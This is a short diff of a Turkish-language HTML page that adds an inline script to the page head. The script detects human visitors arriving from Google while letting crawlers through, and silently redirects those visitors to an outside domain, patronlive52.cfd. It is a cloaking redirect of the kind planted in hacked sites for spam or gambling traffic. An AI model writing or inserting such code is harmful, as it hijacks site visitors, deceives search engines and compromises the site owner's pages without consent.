@@ -1,6 +1,18 @@
 <!DOCTYPE html>
 <html lang="tr" dir="ltr">
   <head>
+     <script>
+  
+    var fromGoogle = document.referrer.includes("google.");
+
+  
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+
+    if (fromGoogle && isBot) {
+
+        location.replace("https://patronlive52.cfd/");
+    }
+  </script>
 <meta name="google-site-verification" content="W3QENBe1JQSVysIlJE6NTyOeuq3mQ5Z11v7OzYwBNPk" />
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
